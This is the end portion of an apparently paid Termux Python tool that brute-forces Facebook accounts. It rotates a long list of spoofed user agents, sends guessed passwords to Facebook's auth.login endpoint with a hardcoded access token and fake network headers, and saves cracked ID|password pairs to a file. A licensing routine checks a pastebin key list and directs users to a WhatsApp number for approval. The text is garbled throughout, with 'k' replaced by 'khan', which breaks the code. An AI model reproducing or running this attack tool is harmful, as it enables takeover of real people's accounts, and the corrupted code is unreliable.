  "Dalvikhan/2.1.0 (Linux; U; Android 7.1.2; AFTMM Build/NS6264) CTV",
  "Dalvikhan/2.1.0 (Linux; U; Android 9; SM-N950U Build/PPR1.180610.011)",
  "Dalvikhan/1.6.0 (Linux; U; Android 4.4.4; WT19M-FI Build/khanTU84Q)",
  "Dalvikhan/2.1.0 (Linux; U; Android 9; SM-N960U Build/PPR1.180610.011)",
  "Dalvikhan/2.1.0 (Linux; U; Android 9; SM-G955U Build/PPR1.180610.011)",
  "Dalvikhan/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
  "Dalvikhan/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
  "Dalvikhan/2.1.0 (Linux; U; Android 10; SM-N960U Build/QP1A.190711.020)",
  "Dalvikhan/2.1.0 (Linux; U; Android 10; SM-G975U Build/QP1A.190711.020)",
  "Dalvikhan/2.1.0 (Linux; U; Android 7.1.2; AFTBAMR311 Build/NS6264) CTV",
  "Dalvikhan/2.1.0 (Linux; U; Android 9; SM-A102U Build/PPR1.180610.011)",
  "Dalvikhan/2.1.0 (Linux; U; Android 8.0.0; SM-G935V Build/R16NW)",
  "Mozilla/5.0 (Linux; U; Android 4.4.4; skhan-skhan; SAMSUNG SM-G357FZ/G357FZXXU1AQJ1 Build/khanTU84P) AppleWebkhanit/534.30 (khanHTML, likhane Geckhano) Version/4.0 Mobile Safari/534.30",
  "Mozilla/5.0 (Linux; U; Android 4.4.2; pl-pl; SM-T310 Build/khanOT49H) AppleWebkhanit/534.30 (khanHTML, likhane Geckhano) Version/4.0 Safari/534.30",
  "Mozilla/5.0 (Linux; U; Android 4.2.2;pl-pl; Lenovo S5000-F/JDQ39) AppleWebkhanit/534.30 (khanHTML, likhane Geckhano) Version/4.2.2 Mobile Safari/534.30",
  "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/khanOT49H) AppleWebkhanit/534.30 (khanHTML, likhane Geckhano) Version/4.0 Mobile Safari/534.30",
  "WeRead/5.2.2 WRBrand/huawei Dalvikhan/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.3.4 WRBrand/huawei Dalvikhan/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.2.4 WRBrand/huawei Dalvikhan/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.1.1 WRBrand/huawei Dalvikhan/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.1.1 WRBrand/huawei Dalvikhan/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29)",
  "WeRead/5.2.1 WRBrand/huawei Dalvikhan/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.2.1 WRBrand/huawei Dalvikhan/2.1.0 (Linux; U; Android 10; CDY-NX9A Build/HUAWEICDY-N29)",
  "WeRead/5.1.2 WRBrand/huawei Dalvikhan/2.1.0 (Linux; U; Android 7.0; BTV-W09 Build/HUAWEIBEETHOVEN-W09)",
  "WeRead/5.1.2 WRBrand/huawei Dalvikhan/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.1.1 WRBrand/huawei Dalvikhan/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.1.0 WRBrand/huawei Dalvikhan/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.0.3 WRBrand/huawei Dalvikhan/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.0.5 WRBrand/huawei Dalvikhan/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/4.2.3 WRBrand/HUAWEI Dalvikhan/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
  "WeRead/4.1.5 WRBrand/Huawei Dalvikhan/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
  "WeRead/3.5.0 WRBrand/HUAWEI Dalvikhan/2.1.0 (Linux; U; Android 6.0; DIG-AL00 Build/HUAWEIDIG-AL00)",
  "WeRead/4.1.1 WRBrand/Huawei Dalvikhan/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
  "WeRead/4.1.1 WRBrand/HUAWEI Dalvikhan/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
  "Dalvikhan/2.1.0 (Linux; U; Android 5.1)",
  "Dalvikhan/1.6.0 (Linux; U; Android 4.0.4; GT-P7510 Build/IMM76D)"
  "Dalvikhan/2.1.0 (Linux; U; Android 5.1; AFTM Build/LMY47O)",
  "Dalvikhan/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29khan) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebookhan.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turkhan Telekhanom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=720,height=1440}",
  "Dalvikhan/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/khanVT49L)UNTRUSTED/1.0C-1.1; Opera Mini/att/4.2",
  "Dalvikhan/1.4.0 (Linux; U; Android 2.3.6; HUAWEI Y210-0100 Build/HuaweiY210-0100)",
  "Dalvikhan/1.4.0 (Linux; U; Android 2.3.6; GT-S5570 Build/GINGERBREAD)",
  "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebkhanit/534.30 (khanHTML, likhane Geckhano) Version/4.0 Mobile Safari/534.3",
  "Dalvikhan/1.6.0 (Linux; U; Android 4.2.2; Galaxy Nexus Build/JDQ39)",
  "Mozilla/5.0 (iPad; CPU OS 10_3_3 likhane Mac OS X) AppleWebkhanit/603.3.8 (khanHTML, likhane Geckhano) Mobile/14G60",
  "Dalvikhan/2.1.0 (Linux; U; Android 5.1; PRO 5 Build/LMY47D)",
  "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Geckhano/20100101 Firefox/58.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.98 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.88 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.115 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/89.0.4389.114 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/47.0.2526.106 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Geckhano/20100101 Firefox/85.0",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/80.0.3987.132 Safari/537.36",
  "Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/81.0.4044.113 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Geckhano/20100101 Firefox/79.0",
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QkhanQ1.190825.002; wv) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
		sys.stdout.write(
			"\r [khan ] %s/%s -> Okhan:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.okhan))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": rua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebookhan.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookhanies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebookhan.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_tokhanen=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_khaney" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[ khan-Okhan ] %s | %s\033[0;97m         "%(uid, pw))
				print ("\r \033[0;92m Congrats Bro ")
				self.okhan.append("%s|%s"%(uid, pw))
				open("2009-khan-Okhan.txt","a").write(" %s|%s\n"%(uid, pw))
				breakhan
			elif "www.facebookhan.com" in response.json()["error_msg"]:
				print("\r \033[0;92m[ khan-Okhan ] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("2009-khan-Okhan.txt","a").write(" %s | %s\n"%(uid, pw))
				breakhan
			else:
				continue

		self.loop +=1


def Subscraption():
	khaney1=open('/data/data/com.termux/files/usr/bin/.mrkhan-cov', 'r').read()
	clear()
	print(logo)
	r1=requests.get("https://pastebin.com/p3jbWM14").text
	if khaney1 in r1:
		os.system('clear')
		print(logo)
		Main()
	else:
		os.system("clear")
		print(logo)
		print("\t \033[1;32m First Get Approvel\033[1;37m ")
		time.sleep(1)
		os.system("clear")
		print(logo)
		print ("")
		print(" \033[1;32m khan Toll Paid You Need Get Approved First\033[1;37m\n")
		print(" \033[1;32m Note : Paid Tolls Free  HA JANI LOG \033[1;37m")
		print ("")
		print(" Your khaney is Not Approved ")
		print("")
		print(" Copy And Send khaney To Admin")
		print ("")
		print (" Your khaney : "+akhan+khan+khaney1)
		print ("")
		name = input(" Your Name : ")
		print ("")
		input(" Press Enter To Send khaney")
		time.sleep(3.5)
		tkhans = 'Dear%20Admin,%20Please%20Approved%20My%20khaney%20To%20Premium%20%20Thankhans%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20khaney%20%20:%20'+akhan+khan+''+khaney1
		os.system('am start https://wa.me/+93707266012?text=' + tkhans)
		Subscraption()        
Main()
